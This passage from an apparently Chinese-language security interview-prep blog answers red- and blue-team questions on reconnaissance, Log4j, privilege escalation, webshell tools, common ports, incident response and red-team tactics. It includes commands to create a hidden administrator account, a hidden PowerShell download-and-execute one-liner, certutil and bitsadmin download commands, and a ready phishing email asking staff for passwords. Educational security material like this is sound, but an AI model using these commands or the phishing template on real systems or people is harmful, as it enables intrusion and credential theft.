114.114.114.114</code></p></li></ol><p>（3）通过全国ping<br>ping出的结果有多个IP地址则说明，使用了CDN<br>（4）使用工具<br>比如<br><code>https://www.cdnplanet.com/tools/cdnfinder</code></p><h2 id="邮件钓鱼的准备工作有哪些？"><a href="#邮件钓鱼的准备工作有哪些？" class="headerlink" title="邮件钓鱼的准备工作有哪些？"></a>邮件钓鱼的准备工作有哪些？</h2><ol><li><p>网络钓鱼攻击的概述<br>网络钓鱼攻击是经常使用社会工程诱饵或引诱内容的骗局。链接到网络钓鱼网站的合法通信（通常是电子邮件）是网络钓鱼攻击中最常见的方法之一。网络钓鱼网站通常模拟需要用户输入凭据和账户信息的登录界面。然后，网络钓鱼网站在用户提供敏感信息后立即捕获该信息，使攻击者能够访问该信息。<br>下面是攻击者用来尝试窃取信息或获取设备访问权限的一些最常见的网络钓鱼技术。<br>（1）发票网络钓鱼<br>（2）付款&#x2F;送货诈骗<br>（3）以税务为主题的网络钓鱼诈骗<br>（4）下载内容<br>（5）发送其它威胁的网络钓鱼电子邮件<br>（6）Spear 网络钓鱼<br>（7）捕鲸<br>（8）商业电子邮件泄露</p></li><li><p>准备工作<br>（1）准备邮件钓鱼的形式：链接、文件<br>（2）收集目标相关的邮箱<br>（3）编写钓鱼邮件文案<br>（4）匿名邮箱<br>（5）木马免杀测试、钓鱼站点搭建<br>（6）反溯源</p></li></ol><h2 id="判断出靶标的CMS，对外网打点有什么意义？"><a href="#判断出靶标的CMS，对外网打点有什么意义？" class="headerlink" title="判断出靶标的CMS，对外网打点有什么意义？"></a>判断出靶标的CMS，对外网打点有什么意义？</h2><ol><li><p>CMS概述<br>CMS是Content Management System的缩写，意为内容管理系统。是一种位于WEB前端（Web服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。</p></li><li><p>CMS对外网打点的意义<br>（1）判断当前使用的CMS是否存在Nday，然后利用公开的poc,exp进行尝试。<br>（2）根据CMS特征关联同CMS框架站点，进行敏感备份文件扫描，有可能获得站点备份文件。尝试从CMS源码进行代码审计，挖掘潜在漏洞。</p></li></ol><p>tips:<br>0 day:未被公开的漏洞<br>1 day:刚刚公布的漏洞<br>n day:已公布n天的漏洞</p><h2 id="Apache-Log4j2的漏洞原理是什么？"><a href="#Apache-Log4j2的漏洞原理是什么？" class="headerlink" title="Apache Log4j2的漏洞原理是什么？"></a>Apache Log4j2的漏洞原理是什么？</h2><p>Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发Log4j2组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。</p><h2 id="水坑攻击和鱼叉攻击的区别是什么？"><a href="#水坑攻击和鱼叉攻击的区别是什么？" class="headerlink" title="水坑攻击和鱼叉攻击的区别是什么？"></a>水坑攻击和鱼叉攻击的区别是什么？</h2><p>水坑攻击(watering hole)：在受害者必经之路设置一个水坑，也即陷阱。常见做法是攻击者分析目标的上网活动规律，经常访问哪些网站，然后利用网站漏洞在其中植入攻击代码，用户访问该网站就中招了。这种方式隐蔽性高，成功率较高。</p><p>鱼叉攻击是指利用木马程序作为电子邮件附件，发送到目标电脑，诱导受害者打开附件感染木马。</p><h2 id="如何判断靶标站点是windows-x2F-linux"><a href="#如何判断靶标站点是windows-x2F-linux" class="headerlink" title="如何判断靶标站点是windows&#x2F;linux?"></a>如何判断靶标站点是windows&#x2F;linux?</h2><ol><li>大小写检测：windows大小写不敏感，Linux大小写敏感。</li><li>ping命令：根据TTL值，windows一般大于100，Linux小于100（TTL，生存时间值：该字段指定IP包被路由器丢弃之前允许通过的最大网段数量）</li></ol><h2 id="无法连接服务器3389端口的几种情况？"><a href="#无法连接服务器3389端口的几种情况？" class="headerlink" title="无法连接服务器3389端口的几种情况？"></a>无法连接服务器3389端口的几种情况？</h2><ol><li><p>3389端口<br>3389端口是Windows 2000(2003) Server 远程桌面的服务端口，可以通过这个端口，用类似于“远程桌面”的连接工具连接到远程服务器，如果连上了，输入系统管理员的用户名和密码后，将变得可以像操作本机一样操作远程电脑，因此远程服务器端口一般都将这个端口修改数值或关闭。</p></li><li><p>无法连接的原因<br>（1）3389端口处于关闭状态<br>（2）远程桌面默认端口号被修改<br>（3）防火墙 拦截<br>（4）处于内网环境<br>（5）超过了服务器最大的连接数<br>（6）管理员设置了权限，指定用户才能通过3389端口访问</p></li></ol><h2 id="如何建立隐藏用户？"><a href="#如何建立隐藏用户？" class="headerlink" title="如何建立隐藏用户？"></a>如何建立隐藏用户？</h2><ol><li>添加$符来添加隐藏用户并加入管理员组<br><code>net user username$ password /add</code><br><code>net localgroup administrators username$ /add</code></li></ol><p>通过该方法建立隐藏用户后，使用 <code>net user</code> 命令不会显示该隐藏用户，但是在控制面板或使用命令 <code>wmic useraccount get Name</code> 可以看到该隐藏用户。<br>删除该用户只需要 <code>net user username$ /del</code></p><ol start="2"><li><p>修改注册表<br>打开注册表，路径如下：<br><code>HKEY_LOCAL_MACHINE\SAM\SAM\</code><br>……<br>以该方法建立的隐藏用户，命令 <code>net user</code> 和控制面板都看不到该用户。<br>但是注册表和wmic能看到该用户。</p></li><li><p>使用工具</p></li></ol><p>方法2,3的具体操作步骤看这篇文章: <a href="https://teamssix.com/220118-134825.html">创建隐藏账号-TeamsSix</a></p><h2 id="为什么MySQL数据库的站点，无法连接？"><a href="#为什么MySQL数据库的站点，无法连接？" class="headerlink" title="为什么MySQL数据库的站点，无法连接？"></a>为什么MySQL数据库的站点，无法连接？</h2><ol><li>站库分离<br>站库分离是管理员将网站程序和数据库分别放到了不同的内网服务器上。大多出现在内网环境，少部分会使用公网数据库（如：自建公网数据库、Amazon&#x2F;阿里&#x2F;腾讯等）。</li><li>3306端口未对外开放（3306是MySQL默认端口）</li><li>MySQL默认端口被修改</li></ol><h2 id="文件上传功能的监测点有哪些？"><a href="#文件上传功能的监测点有哪些？" class="headerlink" title="文件上传功能的监测点有哪些？"></a>文件上传功能的监测点有哪些？</h2><ol><li>客户端Javascript检测（文件后缀名检测）</li><li>服务端检测（MIME类型检测、文件后缀名、文件格式头）<br>MIME（多用途互联网邮件扩展类型）<br>服务端MIME类型检测是通过检查http包的Content-Type字段中的值来判断文件是否合法。</li></ol><h2 id="常见的未授权访问漏洞有哪些？"><a href="#常见的未授权访问漏洞有哪些？" class="headerlink" title="常见的未授权访问漏洞有哪些？"></a>常见的未授权访问漏洞有哪些？</h2><p>未授权访问漏洞：在需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等铭感信息泄露。</p><ol><li>Reddis 未授权访问漏洞</li><li>MongoDB 未授权访问漏洞</li><li>Jenkins 未授权访问漏洞</li><li>Memcached 未授权访问漏洞</li><li>JBOSS 未授权访问漏洞</li><li>VNC 未授权访问漏洞</li><li>Docker 未授权访问漏洞</li><li>ZooKeeper 未授权访问漏洞</li><li>Rsync 未授权访问漏洞</li><li>Atlassian 未授权访问漏洞</li><li>CouchDB 未授权访问漏洞</li><li>Elasticsearch 未授权访问漏洞</li><li>Hadoop 未授权访问漏洞</li><li>Jupyter Notebook 未授权访问漏洞</li></ol><h2 id="代码执行、文件读取、命令执行的函数有哪些？"><a href="#代码执行、文件读取、命令执行的函数有哪些？" class="headerlink" title="代码执行、文件读取、命令执行的函数有哪些？"></a>代码执行、文件读取、命令执行的函数有哪些？</h2><p>代码执行: <code>eval(), call_user_func(), call_user_func_array(), assert(), preg_replace(), create_function(), array_map()</code><br>文件读取: <code>fopen(), readfile(), fread(), file(), show_resource()</code><br>命令执行: <code>system(), exec(), shell_exec(), passthru(), pcntl_exec()</code></p><h2 id="正向shell和反向shell的区别是什么？"><a href="#正向shell和反向shell的区别是什么？" class="headerlink" title="正向shell和反向shell的区别是什么？"></a>正向shell和反向shell的区别是什么？</h2><p>正向shell：攻击机主动连接靶机。可用于攻击机处于内网，靶机处于公网（外网）。<br>反向shell：靶机主动连接攻击机。可用于攻击者处于公网，靶机处于内网。</p><h2 id="正向代理和反向代理的区别？"><a href="#正向代理和反向代理的区别？" class="headerlink" title="正向代理和反向代理的区别？"></a>正向代理和反向代理的区别？</h2><ol><li>正向代理(forward proxy):是一个位于客户端和目标服务器之间的服务器（代理服务器），为了从目标服务器取得内容，客户端向代理服务器发送一个请求并指定目标，然后代理服务器向目标服务器转交请求并将获得的内容返回给客户端。</li><li>反向代理(reverse proxy):是指以代理服务器来接受Internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给Internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。</li><li>区别<br>（1）实质上，正向代理是客户端代理，帮助客户端访问其无法访问的资源；反向代理是服务器代理，帮助服务器做负载均衡，安全防护等。<br>（2）正向代理一般是客户端架设的，比如在自己机器上安装代理软件；反向代理一般是服务器架设的，比如在机器集群中部署一个反向代理服务器。<br>（3）正向代理中服务器不知道真正的客户端是谁；反向代理中客户端不知道真正的服务器是谁。<br>（4）二者目的和作用不同，正向代理主要用来解决访问限制问题，反向代理主要是提供负载均衡、安全防护等作用。二者均能提高访问速度。</li></ol><h2 id="Web-Top10-漏洞是什么（OWASP-2022）"><a href="#Web-Top10-漏洞是什么（OWASP-2022）" class="headerlink" title="Web Top10 漏洞是什么（OWASP 2022）"></a>Web Top10 漏洞是什么（OWASP 2022）</h2><ol><li>失效的访问控制</li><li>加密机制失效</li><li>注入</li><li>不安全的设计</li><li>安全配置错误</li><li>易受攻击和过时组件</li><li>识别和认证失败</li><li>软件和数据完整性故障</li><li>安全日志记录和监控失败</li><li>服务器端请求伪造SSRF<br><a href="https://blog.csdn.net/Gherbirthday0916/article/details/126786601">OWASP Top 10 2022介绍</a></li></ol><h2 id="SQL注入种类有哪些？"><a href="#SQL注入种类有哪些？" class="headerlink" title="SQL注入种类有哪些？"></a>SQL注入种类有哪些？</h2><ol><li>按照注入点类型分为：数字型，字符型，搜索型。</li><li>按照提交方式分为：get型，post型，cookie型，http请求头。</li><li>按照注入手法分为：联合注入，报错注入，布尔盲注，时间盲注，二次注入，宽字节注入，堆叠注入。</li></ol><h2 id="常见的中间件有哪些？分别有哪些漏洞？"><a href="#常见的中间件有哪些？分别有哪些漏洞？" class="headerlink" title="常见的中间件有哪些？分别有哪些漏洞？"></a>常见的中间件有哪些？分别有哪些漏洞？</h2><ol><li><p>IIS是Internet Information Services的缩写，意为互联网信息服务。是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。IIS目前只适用于Windows系统。<br>常见漏洞：目录解析漏洞，文件名解析漏洞，远程代码执行漏洞</p></li><li><p>Apache是一种跨平台的Web服务器，可以在多种操作系统上运行，如Windows,Linux,Unix等。它支持多种编程语言，如PHP,Perl,Python等。<br>常见漏洞：服务端请求伪造漏洞，目录遍历漏洞，解析漏洞</p></li><li><p>Nginx是一款轻量级的Web服务器&#x2F;反向代理服务器及电子邮件（IMAP&#x2F;POP3）代理服务器，特点是占有内存小，并发能力强。<br>常见漏洞：解析漏洞，目录遍历，目录穿越，任意代码执行漏洞</p></li><li><p>JBoss是一个基于J2EE的开源代码应用服务器，由Red Hat公司开发，它是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。开源，免费。<br>常见漏洞：反序列化漏洞，后台部署war包</p></li><li><p>Weblogic是美国Oracle公司出品的一个application server,确切的说是一个基于JavaEE架构的中间件，Weblogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。<br>常见漏洞：反序列化漏洞， 任意文件上传漏洞，SSRF</p></li></ol><h2 id="常见的目录扫描工具有哪些？"><a href="#常见的目录扫描工具有哪些？" class="headerlink" title="常见的目录扫描工具有哪些？"></a>常见的目录扫描工具有哪些？</h2><p>常见的目录扫描工具有御剑、DirBuster、Webdirscan、Cansina、Dirsearch、awvs、wwwscan、dirmap等。</p><h2 id="Windows常见的提权方法有哪些？"><a href="#Windows常见的提权方法有哪些？" class="headerlink" title="Windows常见的提权方法有哪些？"></a>Windows常见的提权方法有哪些？</h2><ol><li><p>内核溢出漏洞提权。<br>攻击者利用该漏洞的关键是目标系统没有及时安装补丁，如果目标系统没有安装某一漏洞的补丁且存在该漏洞，攻击者就会向目标系统上传本地溢出程序，溢出Administrator权限。</p></li><li><p>数据库提权。<br>在提权之前，首先要对系统的操作系统信息做一些信息收集。例如，在大多数情况下，当Windows配置为自动登录时，未加密的凭据存储在注册表项中： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</span><br></pre></td></tr></table></figure><p> 。PowerUpSQL中的“Get-SQLRecoverPwAutoLogon”函数可以获取到默认Windows自动登录信息和备用Windows自动登录信息（如果已设置），然后它返回相关的域名，用户名和密码。</p></li><li><p>系统配置错误提权。<br>在windows操作系统中，黑客通常会通过系统内核溢出漏洞来提权，但是在行不通的情况下，就会利用系统的错误配置来提权。windows操作系统中的常见配置错误包括：管理员凭证配置错误、服务配置错误、故意削弱的安全措施和用户权限过高。</p></li><li><p>组策略首选项提权。<br>组策略首选项提权是一种利用Windows组策略首选项来提升权限的方法。Windows 2008 Server引入了一项称为组策略首选项的新功能，该功能使管理员可以部署影响域中计算机&#x2F;用户的特定配置。通过在组策略管理控制台中配置的组策略首选项，管理员可以推出多种策略，例如，当用户登录其计算机时自动映射网络驱动器，更新内置管理员帐户的用户名或对注册表进行更改。（2014已修复）</p></li><li><p>Bypass UAC提权。<br>实现Bypass UAC的方法主要有两种方法：一种是利用白名单提权机制，另一种是利用COM组件接口技术。例如，可以利用CompMgmtLauncher.exe白名单程序Bypass UAC提权。程序自己创建并添加注册表HKCUSoftwareClassesmscfileshellopencommand (Default)，并写入自定义的程序路径。此外，还有其他几种绕过UAC的方法，包括DLL劫持、Windows自身漏洞提权、远程注入等。（UAC是User Account Control（用户帐户控制）的缩写。它是一种Windows操作系统中的安全功能，旨在防止未经授权的更改，这些更改可能会影响计算机的运行或用户数据。当程序尝试执行需要管理员权限的操作时，UAC会弹出一个提示框，要求用户确认操作。）</p></li><li><p>令牌窃取提权。<br>令牌窃取提权是一种利用Windows访问令牌来提升权限的方法。Windows使用访问令牌来确定正在运行的进程的所有权。用户可以操纵访问令牌以使正在运行的进程看起来像它属于启动该进程的用户以外的其他人。发生这种情况时，该过程还将采用与新令牌关联的安全性上下文。</p></li><li><p>第三方软件&#x2F;服务提权</p></li></ol><p>Reference article:<br><a href="https://www.secpulse.com/archives/189368.html">Windows提权基础</a><br><a href="https://www.freebuf.com/articles/system/338877.html">Window常见提权方法一览</a></p><h2 id="蚁剑-x2F-菜刀-x2F-C刀-x2F-冰蝎的相同与不同之处"><a href="#蚁剑-x2F-菜刀-x2F-C刀-x2F-冰蝎的相同与不同之处" class="headerlink" title="蚁剑&#x2F;菜刀&#x2F;C刀&#x2F;冰蝎的相同与不同之处"></a>蚁剑&#x2F;菜刀&#x2F;C刀&#x2F;冰蝎的相同与不同之处</h2><p>相同之处：都是webshell的管理工具。<br>不同之处：<br>菜刀：流量base64编码，特征比较固定<br>蚁剑：支持自定义加密，但是shell不稳定，且对jsp兼容性差<br>冰蝎：流量动态AES加密，流量比较隐蔽，但是兼容性相对较差，需要匹配服务器后端语言版本</p><h2 id="Windows环境下有哪些下载文件的命令"><a href="#Windows环境下有哪些下载文件的命令" class="headerlink" title="Windows环境下有哪些下载文件的命令"></a>Windows环境下有哪些下载文件的命令</h2><ol><li><p>PowerShell<br>PowerShell是一种跨平台的任务自动化和配置管理框架，由命令行管理程序和脚本语言组成，与大多数接受并返回文本的 shell 不同，PowerShell构建在 .NET公共语言运行时 (CLR) 的基础之上，接受并返回.NET对象，这从根本上的改变引入了全新的自动化工具和方法。<br>远程下载文件到本地（下载路径为当前所处路径）：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.<span class="built_in">Net</span>.WebClient).DownloadFile(&#x27;URL&#x27;,&#x27;Filename&#x27;)</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">powershell -nop -w hidden -c &quot;IEX ((new-object <span class="built_in">net</span>.webclient).downloadstring(&#x27;URL&#x27;))&quot;</span><br></pre></td></tr></table></figure></li><li><p>certutil<br>certutil.exe是一个命令行程序，作为证书服务的一部分安装，可以使用Certutil.exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件，以及验证证书，密钥对和证书链。<br>远程下载文件到本地：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f &lt;URL&gt; &lt;FilePath&gt;</span><br></pre></td></tr></table></figure></li><li><p>bitsadmin<br>BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度，自windows7 以上版本内置bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自动重试，在比较复杂的网络环境下，有着不错的性能。<br>远程文件下载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n &lt;URL&gt; &lt;FilePath\Filename&gt;</span><br></pre></td></tr></table></figure></li><li><p>FTP</p></li><li><p>TFTP</p></li><li><p>cURL<br>cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行，它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具，cURL还包含了用于程序开发的libcurl。<br>远程下载文件到本地：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &lt;URL&gt; -o Filename</span><br></pre></td></tr></table></figure></li><li><p>wget</p></li><li><p>ncat</p></li><li><p>python</p></li></ol><p><a href="https://xz.aliyun.com/t/7937#toc-2">windows&#x2F;Linux文件下载方式汇总</a></p><h2 id="常见的端口号？攻击点？"><a href="#常见的端口号？攻击点？" class="headerlink" title="常见的端口号？攻击点？"></a>常见的端口号？攻击点？</h2><ol><li><p>ftp:20,21<br>匿名文件下载、嗅探、爆破</p></li><li><p>ssh:22<br>弱口令、暴力猜解、用户名枚举<br>1、通过用户名枚举可以判断某个用户名是否存在于目标主机中，2、利用弱口令&#x2F;暴力破解，获取目标主机权限。</p></li><li><p>telnet:23<br>弱口令、明文传输<br>1、通过弱口令或暴力破解，获取目标主机权限。2、嗅探抓取telnet明文账户密码。</p></li><li><p>sql server:1433<br>注入、弱口令、爆破</p></li><li><p>orcle database:1521<br>注入、弱口令、爆破</p></li><li><p>RMI:1090&#x2F;1099<br>JAVA RMI 反序列化远程命令执行漏洞<br>使用nmap检测端口信息。</p></li><li><p>RDP:3389<br>暴力破解<br>通过弱口令或暴力破解，获取目标主机权限。</p></li><li><p>VNC:5900<br>弱口令、暴力破解<br>通过弱口令或暴力破解，获取目标主机权限。</p></li><li><p>Redis database:6379<br>未授权访问、弱口令爆破</p></li><li><p>Weblogic:7001<br>弱口令、SSRF、反序列化漏洞<br>1、控制台弱口令上传war木马2、SSRF内网探测3、反序列化远程代码执行等</p></li><li><p>Zabbix:8069<br>远程命令执行</p></li><li><p>Tomcat:8080<br>弱口令、示例目录<br>通过弱口令登录控制台，上传war包。</p></li><li><p>JBoss:8080<br>未授权访问、反序列化<br>1、未授权访问控制台，远程部署木马2、反序列化导致远程命令执行等。</p></li></ol><h2 id="木马驻留系统的方式有哪些？"><a href="#木马驻留系统的方式有哪些？" class="headerlink" title="木马驻留系统的方式有哪些？"></a>木马驻留系统的方式有哪些？</h2><ol><li>注册表</li><li>关联类型文件</li><li>服务</li><li>启动目录</li><li>计划任务</li></ol><h2 id="常用的威胁情报平台"><a href="#常用的威胁情报平台" class="headerlink" title="常用的威胁情报平台"></a>常用的威胁情报平台</h2><ol><li><a href="virustotal.com">Virustotal</a></li><li><a href="https://exchange.xforce.ibmcloud.com/">IBM X-Force</a></li><li><a href="https://isc.sans.edu/">SANS互联网风暴中心</a></li><li><a href="https://x.threatbook.com/">微步威胁情报中心</a></li><li><a href="https://ti.360.net/">360威胁情报中心</a></li><li><a href="https://ti.qianxin.com/">奇安信威胁情报中心</a></li><li><a href="https://nti.nsfocus.com/">绿盟威胁情报中心</a></li><li><a href="https://ti.dbappsecurity.com.cn/">安恒威胁情报中心</a></li><li><a href="https://www.venuseye.com.cn/">VenusEye威胁情报中心</a></li></ol><h2 id="常用的webshell检测工具"><a href="#常用的webshell检测工具" class="headerlink" title="常用的webshell检测工具"></a>常用的webshell检测工具</h2><ol><li>D盾 – 防火墙（免费，GUI，WebShell 扫描检测查杀。支持系统:win2003&#x2F;win2008&#x2F;win2012&#x2F;win2016）</li><li>WEBDIR+ – 百度Webshell扫描检测引擎（免费，Shell 在线检测查杀）</li><li>WebShell Detector – Webshell扫描器（免费，在线检测查杀）</li><li>WebShell.pub – 河马查杀（免费，GUI &#x2F; 在线 WebShell 扫描检测查杀）</li><li>PHP Malware Finder – webshell扫描查杀（免费，全平台，本地）</li><li>CloudWalker – Webshell扫描检测引擎（免费，全平台支持，线上线下）</li><li>Sangfor WebshellKill – web后门专杀工具（支持Windows、linux，本地）</li></ol><h2 id="一般情况下，哪些漏洞会高频用于打点？"><a href="#一般情况下，哪些漏洞会高频用于打点？" class="headerlink" title="一般情况下，哪些漏洞会高频用于打点？"></a>一般情况下，哪些漏洞会高频用于打点？</h2><ol><li>Apache Shiro相关漏洞</li><li>Fastjson漏洞</li><li>Log4j</li><li>上传漏洞</li><li>边界网络设备资产+弱口令</li></ol><h2 id="Windows常用命令"><a href="#Windows常用命令" class="headerlink" title="Windows常用命令"></a>Windows常用命令</h2><p>type：显示文件类型<br>dir：显示当前目录<br>ipconfig：查看ip地址<br>net user ：查看用户<br>netstat：查看端口<br>tasklist：查看进程列表<br>find：文件中搜索字符串<br>ping：检测网络连通情况</p><h2 id="应急响应的基本思路是什么？"><a href="#应急响应的基本思路是什么？" class="headerlink" title="应急响应的基本思路是什么？"></a>应急响应的基本思路是什么？</h2><p>准备-检测-抑制-根除-恢复-书写报告</p><ol><li>准备工作，收集信息：收集告警信息、客户反馈信息、设备主机信息等。</li><li>检测，判断类型：安全事件类型的判断（钓鱼邮件，webshell，爆破，中毒等）</li><li>抑制，控制范围，隔离失陷设备</li><li>根除，分析研判，将收集的信息分析</li><li>恢复，处置事件类型（进程、文件、邮件、启动项，注册表等）</li><li>输出报告</li></ol><h2 id="Linux常用的命令？"><a href="#Linux常用的命令？" class="headerlink" title="Linux常用的命令？"></a>Linux常用的命令？</h2><p>cat ：显示文件内容<br>ls：列出当前目录的内容<br>ifconfig：查看IP地址<br>whoami：查看当前用户<br>netstat：查看端口<br>ps：查看进程列表<br>grep：文件中搜索字符串<br>ping：检测网站连接情况<br>crontal：检查定时任务</p><h2 id="蓝队常用的反制手段有哪些？"><a href="#蓝队常用的反制手段有哪些？" class="headerlink" title="蓝队常用的反制手段有哪些？"></a>蓝队常用的反制手段有哪些？</h2><p>1、蜜罐（蜜罐技术本质上是一种对攻击方进行欺骗的技术，通过布置一些作为诱饵的主机、网络服务或者信息，诱使攻击方对它们实施攻击，从而可以对攻击行为进行捕获和分析，了解攻击方所使用的工具与方法，推测攻击意图和动机，能够让防御方清晰地了解他们所面对的安全威胁，并通过技术和管理手段来增强实际系统的安全防护能力。）<br>2、对攻击目标进行反渗透（IP定位、IP端口扫描、web站点扫描）<br>3、应用漏洞挖掘&amp;利用（菜刀、Goby、蚁剑）<br>4、id—-&gt; 社交特征关联<br>5、钓鱼网站–&gt;后台扫描、xss盲打<br>6、木马文件—&gt;同源样本关联—-&gt;敏感字符串特侦检测<br>(反钓鱼也逐渐被蓝队重视，通过在服务器上故意放置钓鱼文件，吸引红队主动下载安装，完成反钓鱼。)</p><h2 id="红队攻击手法简要介绍"><a href="#红队攻击手法简要介绍" class="headerlink" title="红队攻击手法简要介绍"></a>红队攻击手法简要介绍</h2><h3 id="红队第一招-信息收集"><a href="#红队第一招-信息收集" class="headerlink" title="红队第一招-信息收集"></a>红队第一招-信息收集</h3><p>资产挖掘（子域名、目录、后台、服务、高位端口应用)<br>Github、Google Hacking等<br>企业信息(办公地点、投资者关系、上下游企业等)<br>企业员工信息收集（百度、微博、邮箱、子号等)<br>Goby网络安全测试工具</p><p>Masscan(最快的互联网端口扫描器)</p><p>Nmap(网络连接扫描工具)</p><p>Oneforall(子域名收集)</p><h3 id="红队第二招-web漏洞攻击"><a href="#红队第二招-web漏洞攻击" class="headerlink" title="红队第二招-web漏洞攻击"></a>红队第二招-web漏洞攻击</h3><p>中间件漏洞攻击（IIS、Nginx解析漏洞、RCE等)<br>第三方组件、框架漏洞攻击(Java反序列化、Struts2 RCE、CMS Oday等)<br>常规WEB技术漏洞攻击(SQLi、XSS、XXE、SSRF、SSJs等)<br>逻辑漏洞(认证缺陷，如:后台弱口令、登录表单可暴力破解、密码找回绕过、短信认证功能缺陷等)</p><h3 id="红队第三招-水坑攻击"><a href="#红队第三招-水坑攻击" class="headerlink" title="红队第三招-水坑攻击"></a>红队第三招-水坑攻击</h3><p>水坑攻击（英语: Watering hole)是一种计算机入侵手法，其针对的目标多为特定的团体（组织、行业、地区等)。攻击者首先通过猜测（或观察）确定这组目标经常访问的网站，并入侵其中一个或多个，植入恶意软件，最后，达到感染该组目标中部分成员的目的。<br>由于此种攻击借助了目标团体所信任的网站，攻击成功率很高，即便是那些对鱼叉攻击或其他形式的网络钓鱼具有防护能力的团体。</p><p>利用条件及具备因素:<br>需要知道目标经常访问的网站;这个网站需要有可利用的漏洞;<br>利用漏洞后需要和原网站样式一致，不引起目标的警觉;使用免杀技术。<br>怎么利用:</p><p>(1）通过信息搜集掌握目标的习惯或访问历史<br>(2）从访问历史中查找可利用的站点<br>(3）精心编写exp，进行UI设计，加入免杀功能，然后在本地进行验证<br>(4）利用站点的漏洞，通过JS或html重写将payload插入目标站点，并诱使用户下载<br>(5)攻击者在本地启用监听，等待目标执行exp<br>为什水坑攻击的成功率高:<br>目标的必经之路;<br>迷惑性极高，不易察觉。<br>做了一件什么事情:利用用户经常访问的站点上的漏洞，挂载恶意程序，诱使用户点击执行。</p><p>如何防御水坑攻击</p><p>1.定期检查员工访问量最大的网站是否存在恶意软件;<br>2.阻止访问所有受感染站点;<br>3.设置浏览器和工具，以利用网站信誉让用户知道不良网站;<br>4.在允许访问这些站点之前，请检查所有来自第三方和外部站点的所有流量并进行验证;<br>5.为了帮助进行验证并增强网络安全状况，建议采用包括威胁检测在内的多种方法。</p><h3 id="红队第四招-网络钓鱼邮件-社会工程学"><a href="#红队第四招-网络钓鱼邮件-社会工程学" class="headerlink" title="红队第四招-网络钓鱼邮件(社会工程学)"></a>红队第四招-网络钓鱼邮件(社会工程学)</h3><p>邮件主题:【通知】账号密码修改温馨提示发件人:<code>usercenter@163.com</code><br>收件人:<code>xxxy@.com.cn</code><br>邮件正文:<br>亲爱的同事，您好:<br>根据公司安全管理规定，域账户近期进行统一重置为强度更高的密码。届时我们会通过邮件发送您的新密码，您的WIFI、邮箱、OA等可自动完成密码同步。<br>为了保证您的账户”xxXy”密码能够顺利重置，请尽快回复本邮件，并填写以下信息:姓名:【必填】<br>职位:【必填】工号:【必填】邮箱:【必填】密码:【必填】手机号:【必填】<br>IT运维中心2022年5月28日</p><h3 id="红队第五招-木马免杀"><a href="#红队第五招-木马免杀" class="headerlink" title="红队第五招-木马免杀"></a>红队第五招-木马免杀</h3><p>又叫免杀毒技术，是反病毒，反间谍的对立面，是一种能使病毒或木马免于被杀毒软件查杀的软件。它除了使病毒木马免于被查杀外，还可以扩增病毒木马的功能，改变病毒木马的行为。免杀的基本特征是破坏特征，有可能是行为特征，只要破坏了病毒与木马所固有的特征，并保证其原有功能没有改变，一次免杀就能完成了。免杀技术也并不是十恶不赦的，例如，在软件保护所用的加密产品(比如壳)中，有一些会被杀毒软件认为是木马病毒;一些安全领域中的部分安全检测产品，也会被杀毒软件误杀，这时就需要免杀技术来应对这些不稳定因素。</p><h3 id="值得关注的攻击队伍"><a href="#值得关注的攻击队伍" class="headerlink" title="值得关注的攻击队伍:"></a>值得关注的攻击队伍:</h3><p>永信:攻防平台厂商，去年得分很高，公安御用团队，实战经验多，手握多个0day<br>长亭:WAF厂商，开源X-ray漏扫，web攻防经验丰富，核心团队能力拔群。<br>阿里:大厂有钱有人，对开源和商业产品研究深入，善于供应链攻击，全员出动支援。<br>腾讯:大厂有钱有人，常年CTF世界冠军，挖通用漏洞能力超强，Oday存货多，能打还能防。<br>奇安信:全线产品厂商，最了解甲方的团队之一，公安御用团队，实战经验多，攻击套路深。<br>安恒:全线产品厂商，最了解甲方的团队之一，公安御用团队，实战经验多，刷1day能力强。<br>360:大厂有钱有人，0day军火库，公安御用团队，实战经验多，打起来没啥顾忌，今年不参加。<br>总结:有钱，有人，常打，御用，支援足，有Oday，套路深，较谨慎，熟悉甲方，信息收集做得好。</p><h3 id="值得关注的安全产品"><a href="#值得关注的安全产品" class="headerlink" 